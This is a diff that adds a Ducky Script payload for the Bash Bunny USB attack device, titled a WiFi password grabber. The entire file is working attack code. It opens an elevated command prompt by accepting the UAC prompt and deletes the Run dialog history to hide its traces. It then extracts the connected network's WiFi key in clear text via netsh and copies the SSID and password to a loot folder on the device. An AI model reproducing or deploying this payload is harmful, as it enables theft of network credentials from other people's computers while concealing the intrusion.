@@ -1,0 +1,69 @@
+REM Title: WiFi password grabber for the bash bunny
+REM Author: Silvian
+REM Props: Siem, Darren Kitchen
+REM Version: 1
+REM Description: Saves the SSID, Network type, Authentication and the password to Log.txt
+DELAY 1000
+GUI r
+DELAY 1000
+STRING powershell Start-Process cmd -Verb runAs
+ENTER
+DELAY 2000
+LEFT
+DELAY 1000
+ENTER
+DELAY 1000
+
+REM Delete registry keys storing Run dialog history
+STRING REG DELETE HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /f
+ENTER
+
+REM --> Getting SSID
+STRING cd "%TEMP%" & for /f "tokens=2 delims=: " %A in ('netsh wlan show interface ^| findstr "SSID" ^| findstr /v "BSSID"') do set A=%A
+ENTER
+
+REM --> Creating A.txt
+STRING netsh wlan show profiles %A% key=clear | findstr /c:"Network type" /c:"Authentication" /c:"Key Content" | findstr /v "broadcast" | findstr /v "Radio">>A.txt
+ENTER
+
+REM --> Get network type
+STRING for /f "tokens=3 delims=: " %A in ('findstr "Network type" A.txt') do set B=%A
+ENTER
+
+REM --> Get authentication
+STRING for /f "tokens=2 delims=: " %A in ('findstr "Authentication" A.txt') do set C=%A
+ENTER
+
+REM --> Get password
+STRING for /f "tokens=3 delims=: " %A in ('findstr "Key Content" A.txt') do set D=%A
+ENTER
+
+REM --> Delete A.txt
+STRING del A.txt
+ENTER
+
+REM --> Create Log.txt
+STRING echo SSID: %A%>>Log.txt & echo Network type: %B%>>Log.txt & echo Authentication: %C%>>Log.txt & echo Password: %D%>>Log.txt
+ENTER
+
+REM Creates directory compromised of computer name, date and time
+REM %~d0 = path to this batch file. %COMPUTERNAME%, %date% and %time% pretty obvious
+STRING for /f %D in ('wmic volume get DriveLetter^, Label ^| find "BashBunny"') do set usb=%D
+ENTER
+DELAY 200
+ENTER
+
+REM Create directory on the bash bunny as wifi creds and computer name and date time stamp
+STRING set dst=%usb%\loot\WiFi_Creds\%COMPUTERNAME%_%date:~-4,4%%date:~-10,2%%date:~7,2%_%time:~-11,2%%time:~-8,2%%time:~-5,2%
+ENTER
+DELAY 200
+ENTER
+STRING mkdir %dst% >>nul
+ENTER
+
+REM Move the Log.txt to the created directory on the bash bunny
+STRING move Log.txt %dst% >>nul
+ENTER
+DELAY 100
+STRING exit
+ENTER
